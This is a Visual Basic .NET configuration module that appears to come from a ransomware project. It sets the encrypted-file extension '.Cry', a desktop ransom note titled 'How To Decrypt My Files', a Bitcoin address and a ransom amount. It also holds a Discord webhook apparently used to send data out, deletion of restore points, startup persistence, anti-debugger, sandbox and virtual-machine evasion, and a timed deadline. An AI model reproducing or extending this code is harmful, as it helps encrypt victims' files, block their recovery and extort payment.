﻿Module St
    'options
    Public webhook As String = "https://discord.com/api/webhooks/816008354065416215/oYSubP4bdGoy9bWfFabwIi4Vc9A_utG5BOlFFIFXRUj8WtL8i98RhbtRyQkOk6EG91-t"
    Public hash As String
    Public startup As String = "True" 'startup
    Public DeleteRestorePoints As String = "True"
    Public mute As String = "qRERbdKw22juwi2Y" 'mute

    Public exs As String = ".Cry" ' exs
    Public html As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\How To Decrypt My Files.html"

    Public btc As String = "3PirF4RjK5RyRpfgU3NY2MzNwDwUcsxFN4" ' your btc address
    Public email As String = "Test@mail.com" ' your email
    Public amount As String = "100" ' 300 $


    ' Anti Analysi
    Public Emulator As String = "True"
    Public DetectDebugger As String = "True"
    Public DetectSandboxie As String = "True"
    Public DetectVirtualMachine As String = "True"
    Public anyrun As String = "True"

    ' Time
    Public Setting As String = "Runcount.cry"
    Public H As Integer = "71"
    Public m As Integer = "59"
    Public Del As Object = GetSetting("D", "0", St.Setting)
    Public Attempts As String = "3"

    Public maxrandom As Integer = 20
    Public validchars As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"

End Module
